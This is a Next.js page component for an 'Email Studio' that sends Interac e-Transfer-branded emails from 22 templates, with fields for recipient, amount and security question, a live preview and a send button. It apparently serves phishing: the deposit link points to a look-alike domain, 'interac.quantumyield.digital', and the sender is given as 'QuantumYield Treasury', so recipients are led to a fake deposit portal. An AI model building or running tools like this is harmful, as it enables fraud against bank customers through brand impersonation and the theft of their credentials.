"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { ProtectedRoute } from "@/components/protected-route"
import { emailTemplates, templateCategories, getTemplatesByCategory } from "@/lib/email-templates-collection"
import { generateInteracEmailHtml } from "@/lib/email-template"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Textarea } from "@/components/ui/textarea"
import { Card } from "@/components/ui/card"
import {
  ArrowLeft,
  Search,
  Send,
  Eye,
  X,
  CheckCircle2,
  Loader2,
  ArrowDownCircle,
  ArrowUpCircle,
  Clock,
  XCircle,
  AlertTriangle,
  CheckCircle,
  XOctagon,
  Bell,
  FileText,
  Zap,
  Shield,
  AlertOctagon,
  Key,
  Lock,
  UserCheck,
  BadgeCheck,
  UserCog,
  Building,
  TrendingUp,
  HandCoins,
  ThumbsUp,
  ThumbsDown,
  Mail,
  Sparkles,
  LayoutGrid,
} from "lucide-react"

const iconMap: Record<string, React.ComponentType<{ className?: string }>> = {
  ArrowDownCircle,
  ArrowUpCircle,
  Clock,
  XCircle,
  AlertTriangle,
  CheckCircle,
  XOctagon,
  Bell,
  FileText,
  Zap,
  Shield,
  AlertOctagon,
  Key,
  Lock,
  UserCheck,
  BadgeCheck,
  UserCog,
  Building,
  TrendingUp,
  HandCoins,
  ThumbsUp,
  ThumbsDown,
}

function InteracLoader({ onComplete }: { onComplete: () => void }) {
  const [progress, setProgress] = useState(0)
  const [fadeOut, setFadeOut] = useState(false)

  useEffect(() => {
    const timer = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 100) {
          clearInterval(timer)
          setTimeout(() => setFadeOut(true), 200)
          setTimeout(() => onComplete(), 600)
          return 100
        }
        return prev + 5
      })
    }, 30)
    return () => clearInterval(timer)
  }, [onComplete])

  return (
    <div
      className={`fixed inset-0 z-50 flex items-center justify-center bg-black transition-opacity duration-500 ${fadeOut ? "opacity-0" : "opacity-100"}`}
    >
      <div className="flex flex-col items-center gap-8">
        <div className="relative">
          <div className="w-20 h-20 sm:w-24 sm:h-24 bg-[#FDB913] rounded-2xl flex items-center justify-center p-4 animate-pulse shadow-lg shadow-[#FDB913]/30">
            <Mail className="w-10 h-10 sm:w-12 sm:h-12 text-black" />
          </div>
          <div className="absolute -inset-3 border-4 border-transparent border-t-[#FDB913] rounded-full animate-spin" />
        </div>
        <div className="text-center">
          <h2 className="text-xl sm:text-2xl font-bold text-white mb-2">Email Studio</h2>
          <p className="text-zinc-400 text-sm">Loading 22 templates...</p>
        </div>
        <div className="w-48 sm:w-64 h-1.5 bg-zinc-800 rounded-full overflow-hidden">
          <div
            className="h-full bg-gradient-to-r from-[#FDB913] to-[#e5a811] rounded-full transition-all duration-100 ease-out"
            style={{ width: `${progress}%` }}
          />
        </div>
      </div>
    </div>
  )
}

function EmailStudioContent() {
  const router = useRouter()
  const [isLoading, setIsLoading] = useState(true)
  const [searchTerm, setSearchTerm] = useState("")
  const [activeCategory, setActiveCategory] = useState("all")
  const [selectedTemplate, setSelectedTemplate] = useState<string | null>(null)
  const [showPreview, setShowPreview] = useState(false)
  const [sending, setSending] = useState(false)
  const [success, setSuccess] = useState(false)
  const [error, setError] = useState("")

  const [formData, setFormData] = useState({
    recipientEmail: "",
    recipientName: "John Doe",
    amount: "1,500.00",
    message: "",
    securityQuestion: "What is the verification code?",
    securityAnswer: "SECURE123",
  })

  const filteredTemplates = getTemplatesByCategory(activeCategory).filter(
    (t) =>
      t.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
      t.description.toLowerCase().includes(searchTerm.toLowerCase())
  )

  const currentTemplate = emailTemplates.find((t) => t.id === selectedTemplate)

  const previewHtml = generateInteracEmailHtml({
    recipientName: formData.recipientName,
    amount: parseFloat(formData.amount.replace(/,/g, "")) || 0,
    message: formData.message || undefined,
    securityQuestion: formData.securityQuestion,
    securityAnswer: formData.securityAnswer,
    transferId: `INTC-${Date.now().toString().slice(-6)}-PREVIEW`,
    depositLink: "https://interac.quantumyield.digital/deposit-portal",
    senderName: "QuantumYield Treasury",
    institution: "QuantumYield Holdings | Treasury & Vault Portal",
  })

  const handleSendEmail = async () => {
    if (!formData.recipientEmail) {
      setError("Please enter a recipient email address")
      return
    }

    setError("")
    setSuccess(false)
    setSending(true)

    try {
      const response = await fetch("/api/send-interac", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          ...formData,
          amount: formData.amount.replace(/,/g, ""),
        }),
      })

      const data = await response.json()

      if (!response.ok) {
        throw new Error(data.error || "Failed to send email")
      }

      setSuccess(true)
      setTimeout(() => setSuccess(false), 5000)
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed to send email")
    } finally {
      setSending(false)
    }
  }

  if (isLoading) {
    return <InteracLoader onComplete={() => setIsLoading(false)} />
  }

  return (
    <div className="fixed inset-0 bg-gradient-to-br from-zinc-950 via-zinc-900 to-black overflow-hidden flex flex-col">
      {/* Animated background */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute -top-1/2 -left-1/2 w-full h-full bg-gradient-to-br from-[#FDB913]/5 via-transparent to-transparent rounded-full blur-3xl animate-pulse" />
        <div className="absolute -bottom-1/2 -right-1/2 w-full h-full bg-gradient-to-tl from-pink-500/5 via-transparent to-transparent rounded-full blur-3xl animate-pulse" style={{ animationDelay: "1s" }} />
      </div>

      {/* Header */}
      <header className="relative z-10 flex items-center justify-between px-4 sm:px-6 lg:px-8 py-4 border-b border-zinc-800/50">
        <div className="flex items-center gap-4">
          <button
            onClick={() => router.push("/dashboard")}
            className="flex items-center justify-center w-10 h-10 rounded-xl bg-zinc-800/50 border border-zinc-700 hover:border-zinc-600 transition-colors"
          >
            <ArrowLeft className="w-5 h-5 text-zinc-400" />
          </button>
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-gradient-to-br from-pink-500 to-rose-600 rounded-xl flex items-center justify-center shadow-lg shadow-pink-500/20">
              <Mail className="w-5 h-5 text-white" />
            </div>
            <div>
              <h1 className="text-lg font-bold text-white">Email Studio</h1>
              <p className="text-xs text-zinc-500">22 Professional Templates</p>
            </div>
          </div>
        </div>

        <div className="flex items-center gap-3">
          <div className="relative hidden sm:block">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-500" />
            <Input
              placeholder="Search templates..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="w-64 pl-9 bg-zinc-800/50 border-zinc-700 text-white placeholder:text-zinc-500 focus:border-[#FDB913]"
            />
          </div>
          <div className="flex items-center gap-2 px-3 py-2 bg-zinc-800/50 border border-zinc-700 rounded-xl">
            <Sparkles className="w-4 h-4 text-[#FDB913]" />
            <span className="text-sm font-medium text-white">22</span>
            <span className="text-xs text-zinc-500 hidden sm:inline">templates</span>
          </div>
        </div>
      </header>

      {/* Mobile search */}
      <div className="sm:hidden px-4 py-3 border-b border-zinc-800/50">
        <div className="relative">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-500" />
          <Input
            placeholder="Search templates..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="w-full pl-9 bg-zinc-800/50 border-zinc-700 text-white placeholder:text-zinc-500"
          />
        </div>
      </div>

      {/* Main content */}
      <div className="relative z-10 flex-1 flex overflow-hidden">
        {/* Sidebar - Categories */}
        <aside className="w-48 lg:w-56 border-r border-zinc-800/50 p-4 hidden md:block overflow-y-auto">
          <h3 className="text-xs font-semibold text-zinc-500 uppercase tracking-wider mb-3">Categories</h3>
          <nav className="space-y-1">
            {templateCategories.map((category) => (
              <button
                key={category.id}
                onClick={() => setActiveCategory(category.id)}
                className={`w-full flex items-center justify-between px-3 py-2.5 rounded-lg text-sm transition-all ${
                  activeCategory === category.id
                    ? "bg-[#FDB913]/10 text-[#FDB913] border border-[#FDB913]/30"
                    : "text-zinc-400 hover:text-white hover:bg-zinc-800/50"
                }`}
              >
                <span>{category.name}</span>
                <span className={`text-xs px-2 py-0.5 rounded-full ${
                  activeCategory === category.id ? "bg-[#FDB913]/20" : "bg-zinc-800"
                }`}>
                  {category.count}
                </span>
              </button>
            ))}
          </nav>
        </aside>

        {/* Templates Grid */}
        <main className="flex-1 overflow-y-auto p-4 sm:p-6">
          {/* Mobile category pills */}
          <div className="md:hidden flex gap-2 overflow-x-auto pb-4 mb-4 scrollbar-hide">
            {templateCategories.map((category) => (
              <button
                key={category.id}
                onClick={() => setActiveCategory(category.id)}
                className={`flex-shrink-0 px-4 py-2 rounded-full text-sm font-medium transition-all ${
                  activeCategory === category.id
                    ? "bg-[#FDB913] text-black"
                    : "bg-zinc-800 text-zinc-400 hover:text-white"
                }`}
              >
                {category.name} ({category.count})
              </button>
            ))}
          </div>

          {/* Grid header */}
          <div className="flex items-center justify-between mb-4">
            <h2 className="text-lg font-semibold text-white flex items-center gap-2">
              <LayoutGrid className="w-5 h-5 text-[#FDB913]" />
              {templateCategories.find(c => c.id === activeCategory)?.name || "All Templates"}
            </h2>
            <span className="text-sm text-zinc-500">{filteredTemplates.length} templates</span>
          </div>

          {/* Templates grid */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
            {filteredTemplates.map((template, index) => {
              const IconComponent = iconMap[template.icon] || Mail
              return (
                <button
                  key={template.id}
                  onClick={() => {
                    setSelectedTemplate(template.id)
                    setShowPreview(true)
                  }}
                  className="group relative bg-zinc-900/50 border border-zinc-800 hover:border-zinc-700 rounded-2xl p-4 text-left transition-all duration-300 hover:scale-[1.02] hover:shadow-xl hover:shadow-black/20"
                  style={{
                    animationDelay: `${index * 30}ms`,
                    animation: "fadeInUp 0.4s ease-out forwards",
                    opacity: 0,
                  }}
                >
                  {/* Icon */}
                  <div className={`w-12 h-12 rounded-xl bg-gradient-to-br ${template.color} flex items-center justify-center mb-3 group-hover:scale-110 transition-transform duration-300`}>
                    <IconComponent className="w-6 h-6 text-white" />
                  </div>

                  {/* Content */}
                  <h3 className="font-semibold text-white mb-1 group-hover:text-[#FDB913] transition-colors">
                    {template.name}
                  </h3>
                  <p className="text-xs text-zinc-500 mb-3 line-clamp-2">
                    {template.description}
                  </p>

                  {/* Category badge */}
                  <span className="inline-flex items-center px-2 py-1 rounded-md text-xs font-medium bg-zinc-800 text-zinc-400">
                    {template.category}
                  </span>

                  {/* Hover overlay */}
                  <div className="absolute inset-0 rounded-2xl bg-gradient-to-t from-[#FDB913]/10 to-transparent opacity-0 group-hover:opacity-100 transition-opacity pointer-events-none" />
                </button>
              )
            })}
          </div>
        </main>

        {/* Preview Panel */}
        {showPreview && currentTemplate && (
          <aside className="w-full md:w-[500px] lg:w-[600px] border-l border-zinc-800/50 bg-zinc-900/80 backdrop-blur-sm flex flex-col absolute md:relative inset-0 z-20">
            {/* Preview header */}
            <div className="flex items-center justify-between p-4 border-b border-zinc-800/50">
              <div className="flex items-center gap-3">
                {(() => {
                  const IconComponent = iconMap[currentTemplate.icon] || Mail
                  return (
                    <div className={`w-10 h-10 rounded-xl bg-gradient-to-br ${currentTemplate.color} flex items-center justify-center`}>
                      <IconComponent className="w-5 h-5 text-white" />
                    </div>
                  )
                })()}
                <div>
                  <h3 className="font-semibold text-white">{currentTemplate.name}</h3>
                  <p className="text-xs text-zinc-500">{currentTemplate.category}</p>
                </div>
              </div>
              <button
                onClick={() => setShowPreview(false)}
                className="w-8 h-8 flex items-center justify-center rounded-lg hover:bg-zinc-800 transition-colors"
              >
                <X className="w-5 h-5 text-zinc-400" />
              </button>
            </div>

            {/* Form & Preview */}
            <div className="flex-1 overflow-y-auto p-4 space-y-4">
              {/* Configuration form */}
              <Card className="bg-zinc-800/50 border-zinc-700 p-4">
                <h4 className="text-sm font-semibold text-white mb-4 flex items-center gap-2">
                  <Send className="w-4 h-4 text-[#FDB913]" />
                  Email Configuration
                </h4>
                <div className="space-y-3">
                  <div>
                    <label className="text-xs font-medium text-zinc-400 mb-1 block">Recipient Email</label>
                    <Input
                      type="email"
                      placeholder="recipient@example.com"
                      value={formData.recipientEmail}
                      onChange={(e) => setFormData({ ...formData, recipientEmail: e.target.value })}
                      className="bg-zinc-900/50 border-zinc-700 text-white placeholder:text-zinc-600"
                    />
                  </div>
                  <div className="grid grid-cols-2 gap-3">
                    <div>
                      <label className="text-xs font-medium text-zinc-400 mb-1 block">Recipient Name</label>
                      <Input
                        value={formData.recipientName}
                        onChange={(e) => setFormData({ ...formData, recipientName: e.target.value })}
                        className="bg-zinc-900/50 border-zinc-700 text-white"
                      />
                    </div>
                    <div>
                      <label className="text-xs font-medium text-zinc-400 mb-1 block">Amount (CAD)</label>
                      <Input
                        value={formData.amount}
                        onChange={(e) => setFormData({ ...formData, amount: e.target.value })}
                        className="bg-zinc-900/50 border-zinc-700 text-white"
                      />
                    </div>
                  </div>
                  <div>
                    <label className="text-xs font-medium text-zinc-400 mb-1 block">Message (Optional)</label>
                    <Textarea
                      placeholder="Add a message..."
                      value={formData.message}
                      onChange={(e) => setFormData({ ...formData, message: e.target.value })}
                      rows={2}
                      className="bg-zinc-900/50 border-zinc-700 text-white placeholder:text-zinc-600"
                    />
                  </div>
                  <div>
                    <label className="text-xs font-medium text-zinc-400 mb-1 block">Security Question</label>
                    <Input
                      value={formData.securityQuestion}
                      onChange={(e) => setFormData({ ...formData, securityQuestion: e.target.value })}
                      className="bg-zinc-900/50 border-zinc-700 text-white"
                    />
                  </div>
                  <div>
                    <label className="text-xs font-medium text-zinc-400 mb-1 block">Security Answer</label>
                    <Input
                      type="password"
                      value={formData.securityAnswer}
                      onChange={(e) => setFormData({ ...formData, securityAnswer: e.target.value })}
                      className="bg-zinc-900/50 border-zinc-700 text-white"
                    />
                  </div>
                </div>

                <div className="mt-4 flex gap-2">
                  <Button
                    onClick={handleSendEmail}
                    disabled={sending}
                    className="flex-1 bg-[#FDB913] hover:bg-[#e5a811] text-black font-semibold"
                  >
                    {sending ? (
                      <>
                        <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                        Sending...
                      </>
                    ) : success ? (
                      <>
                        <CheckCircle2 className="w-4 h-4 mr-2" />
                        Sent!
                      </>
                    ) : (
                      <>
                        <Send className="w-4 h-4 mr-2" />
                        Send Email
                      </>
                    )}
                  </Button>
                </div>

                {error && (
                  <div className="mt-3 p-3 bg-red-950/50 border border-red-900/50 rounded-lg text-red-400 text-sm">
                    {error}
                  </div>
                )}
                {success && (
                  <div className="mt-3 p-3 bg-green-950/50 border border-green-900/50 rounded-lg text-green-400 text-sm">
                    Email sent successfully to {formData.recipientEmail}
                  </div>
                )}
              </Card>

              {/* Live preview */}
              <Card className="bg-zinc-800/50 border-zinc-700 p-4">
                <h4 className="text-sm font-semibold text-white mb-3 flex items-center gap-2">
                  <Eye className="w-4 h-4 text-[#FDB913]" />
                  Live Preview
                </h4>
                <div className="border border-zinc-700 rounded-lg overflow-hidden">
                  <iframe
                    title="Email Preview"
                    srcDoc={previewHtml}
                    className="w-full bg-white"
                    style={{ height: "500px" }}
                  />
                </div>
              </Card>
            </div>
          </aside>
        )}
      </div>

      {/* CSS for animations */}
      <style jsx>{`
        @keyframes fadeInUp {
          from {
            opacity: 0;
            transform: translateY(20px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        .scrollbar-hide::-webkit-scrollbar {
          display: none;
        }
        .scrollbar-hide {
          -ms-overflow-style: none;
          scrollbar-width: none;
        }
      `}</style>
    </div>
  )
}

export default function EmailStudioPage() {
  return (
    <ProtectedRoute>
      <EmailStudioContent />
    </ProtectedRoute>
  )
}
